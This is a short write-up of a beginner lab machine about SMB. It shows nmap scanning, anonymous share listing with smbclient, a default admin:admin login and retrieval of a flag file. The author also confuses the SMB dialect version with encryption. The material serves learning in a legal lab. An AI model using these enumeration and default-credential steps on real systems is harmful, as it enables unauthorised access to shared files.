>[!tldr] Dancing is a very easy Windows machine which introduces the Server Message Block ( #SMB ) protocol, its enumeration and its exploitation when misconfigured to allow access without a password.

---

- Knowing that the machine works off of `Server Message Block (SMB)`. I learn a little more, "The SMB protocol is mainly used to facilitate shared access to the resources on a network." 
1. Its common port is `445` so ill nmap that first. `nmap <ip> -sCV -p445`
```shell
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-06-02T21:43:23
|_  start_date: N/A
|_clock-skew: 3h59m59s
```
- Awesome the port is open and we get service info, its `smb2` and "security-mode" `3.1.1`. That version indicates there's AES-128-GCM encryption, so we wont be decrypting on a normal computer. Better find some misconfigurations
2. Lets start with checking null session or anonymous sign on
```shell
❯ smbclient --no-pass --list //10.129.1.12

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
SMB1 disabled -- no workgroup available
```
- No password gave us some shares which we should try to enumerate
3. I then tried a automated tool for enumeration `enum4linux-ng` but I didnt see a great output
4. I then decided to try `admin:admin` which worked!
```shell
❯ smbclient //10.129.1.12/WorkShares -U admin admin
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021
```
- After checking the directories i found `flag.txt` inside "James.P" directory. I then ran `get` to download it and cat the file to get the flag
	- Flag -> `[REDACTED_FLAG]`